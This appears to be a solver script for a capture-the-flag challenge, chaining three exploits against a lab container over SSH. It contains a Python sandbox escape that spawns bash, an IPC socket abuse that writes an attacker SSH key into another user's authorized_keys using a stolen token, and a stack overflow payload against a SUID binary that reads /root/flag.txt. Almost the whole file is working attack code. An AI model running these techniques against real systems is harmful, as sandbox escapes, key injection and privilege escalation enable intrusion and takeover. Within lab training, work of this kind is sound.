#!/usr/bin/env python3
"""
Containment Breach Automated Exploit Chain Solver
Solves Stages 1, 2, and 3 deterministically:
  Stage 1: PyJail AST Filter Breakout to Bash
  Stage 2: Sentry Agent IPC Path Override to SSH Key Injection
  Stage 3: SUID Container-ctl Stack Buffer Overflow to Root Flag
"""

import re
import sys
import time
import argparse
import paramiko

def solve(host="127.0.0.1", port=22, user="ctf", password="sentinel123"):
    print(f"[*] Initiating exploit against {host}:{port} as user '{user}'...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(host, port=port, username=user, password=password, timeout=15)
    except Exception as e:
        print(f"[-] SSH connection failed: {e}")
        return False

    print("[+] Stage 0: Connected via SSH to entrypoint shell.")
    channel = client.invoke_shell()
    time.sleep(1)

    def read_until(pattern=None, timeout=10):
        buf = ""
        start = time.time()
        while time.time() - start < timeout:
            if channel.recv_ready():
                data = channel.recv(4096).decode("utf-8", errors="ignore")
                buf += data
                if pattern and pattern in buf:
                    return buf
            time.sleep(0.1)
        return buf

    read_until("sentinel:~$", timeout=5)
    print("[+] Stage 1: Reached Sentinel Restricted Diagnostics Shell.")

    # Stage 1: AST Breakout to full bash
    ast_payload = (
        "eval-rule \"[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__ == chr(80)+chr(111)+chr(112)+chr(101)+chr(110)][0]"
        "(['/bin/bash', '-i']).wait()\"\n"
    )
    print("[*] Sending Stage 1 AST PyJail breakout payload...")
    channel.send(ast_payload)
    read_until("@", timeout=5)
    print("[+] Stage 1 SUCCESS: Full interactive bash shell achieved!")

    # Stage 2: Generate key and inject via IPC socket
    print("[*] Stage 2: Injecting SSH public key via /run/sentinel/sentry.sock...")
    stage2_script = (
        "rm -f /tmp/id_rsa /tmp/id_rsa.pub\n"
        "ssh-keygen -t rsa -N \"\" -f /tmp/id_rsa -q\n"
        "python3 -c \"import socket, json; "
        "token = open('/var/run/sentinel/sentry.token').read().strip(); "
        "pub = open('/tmp/id_rsa.pub').read().strip() + '\\n'; "
        "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); "
        "s.connect('/run/sentinel/sentry.sock'); "
        "s.sendall(json.dumps({'auth_token': token, 'action': 'save_snapshot', "
        "'filename': '/home/sentry/.ssh/authorized_keys', 'data': pub}).encode()); "
        "print('IPC_RESULT:' + s.recv(4096).decode())\"\n"
    )
    channel.send(stage2_script)
    out2 = read_until("Snapshot archived successfully", timeout=8)
    if "Snapshot archived successfully" not in out2:
        print("[-] Stage 2 IPC exploitation failed. Buffer:", out2)
        client.close()
        return False
    print("[+] Stage 2 SUCCESS: SSH key injected into /home/sentry/.ssh/authorized_keys!")

    # Stage 3: Craft ret2win payload and trigger emergency console
    print("[*] Stage 3: Executing SUID container-ctl buffer overflow as user sentry...")
    stage3_script = (
        "python3 -c \"import sys; sys.stdout.buffer.write(b'A'*152 + (0x4012d6).to_bytes(8, 'little'))\" > /tmp/pwn.bin\n"
        "ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa sentry@localhost "
        "'/opt/sentinel/bin/container-ctl --load-diag /tmp/pwn.bin' <<< $'cat /root/flag.txt\\nexit'\n"
    )
    channel.send(stage3_script)
    out3 = read_until("SENTINEL CRITICAL FAULT", timeout=10)
    time.sleep(1)
    if channel.recv_ready():
        out3 += channel.recv(4096).decode("utf-8", errors="ignore")

    # Match dynamic flag format
    flag_match = re.search(r"([A-Za-z0-9_-]+\{[^}\s]+\})", out3)
    if flag_match:
        flag = flag_match.group(1).strip()
        print("\n" + "="*60)
        print(f"[🎉] CONGRATULATIONS! ALL STAGES EXPLOITED!")
        print(f"[🏁] RETRIEVED FLAG: {flag}")
        print("="*60 + "\n")
        client.close()
        return flag
    else:
        print("[-] Stage 3 exploit executed but flag pattern not found.")
        print("Raw output:\n", out3)
        client.close()
        return False

def main():
    parser = argparse.ArgumentParser(description="Containment Breach Exploit Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target container IP / Host")
    parser.add_argument("--port", type=int, default=22, help="Target SSH port")
    parser.add_argument("--user", default="ctf", help="SSH username")
    parser.add_argument("--password", default="sentinel123", help="SSH password")
    args = parser.parse_args()

    res = solve(args.host, args.port, args.user, args.password)
    if res:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
